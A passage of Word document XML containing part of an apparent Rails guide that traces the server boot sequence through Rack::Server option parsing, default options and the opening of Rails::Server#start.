                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6EC19E48" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In fact, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method here does quite a lot. This method is defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4248"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3B91A2F9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14E21D08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41806C89" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @options</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>||= parse_options(ARGV)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76D0992F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D2610E2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parse_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is defined like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4629CA96" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1862938F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>parse_options(args)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18C3862E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options = default_options</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FFF5327" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2125BABD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # Don't evaluate CGI ISINDEX parameters.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F79A7A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">  # </w:t>
            </w:r>
            <w:hyperlink r:id="rId1073" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://hoohoo.ncsa.uiuc.edu/cgi/cl.html</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w14:paraId="39214D9E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  args.clear if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ENV.include?("REQUEST_METHOD")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DAB76B9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45F66642" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options.merge! opt_parser.parse! args</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18BDBDA8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options[:config] = ::File.expand_path(options[:config])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42219B0A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ENV["RACK_ENV"] = options[:environment]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E45B3A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7309485B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C4DBC53" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>default_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> set to this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6768"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1A309605" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D3EA234" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>default_options</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46E18DDD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="560C437B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :environment</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; ENV['RACK_ENV'] || "development",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F85AA9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :pid</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">         </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; nil,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35EF1636" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :Port        =&gt; 9292,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3033F2E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :Host        =&gt; "0.0.0.0",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53FA673A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :AccessLog   =&gt; [],</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4856F7B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :config</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">      </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "config.ru"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B69BA36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32199331" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54F801C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There is no </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>REQUEST_METHOD</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> key in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ENV</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so we can skip over that line. The next line merges in the options from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>opt_parser</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is defined plainly in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Server</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="49EE8F1B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4968FF77" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>opt_parser</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C1D5FB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Options.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DED76AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5FF4EAEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The class </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, but is overwritten in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to take different arguments. Its </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parse!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method begins like this: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F106919" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51E58A6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>parse!(args)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DFC2287" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  args, options = args.dup, {}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CC59850" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43713E42" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  opt_parser = OptionParser.new</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|opts|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A6E33EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    opts.banner = "Usage: rails server [mongrel, thin, etc] [options]"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20CB1604" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    opts.on("-p", "--port=port", Integer,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A186827" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>            "Runs Rails on the specified port.", "Default: 3000") { |v| options[:Port] = v }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05606BB3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="139CD155" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method will set up keys for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which Rails will then be able to use to determine how its server should run. After </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has finished, then the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>start</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method will launch the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021756EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Server#start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546E08DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method is defined like this:</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0922806" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C5675BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>start</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BEF4BF1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts "=&gt; Booting #{ActiveSupport::Inflector.demodulize(server)}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6641418D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">  puts "=&gt; Rails #{Rails.version} application starting in #{Rails.env} on </w:t>
            </w:r>
            <w:hyperlink w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#{options[:Host]}:#{options[:Port]}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="707CB8BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts "=&gt; Call with -d to detach"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options[:daemonize]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BC7B718" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  trap(:INT) { exit }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37C819EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts "=&gt; Ctrl-C to shutdown server"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options[:daemonize]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12970C23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47B9644B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  #Create required tmp directories if not found</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E497953" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  %w(cache pids sessions sockets).each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|dir_to_make|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53C02417" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    FileUtils.mkdir_p(Rails.root.join('tmp', dir_to_make))</w:t>
            </w:r>
          </w:p>
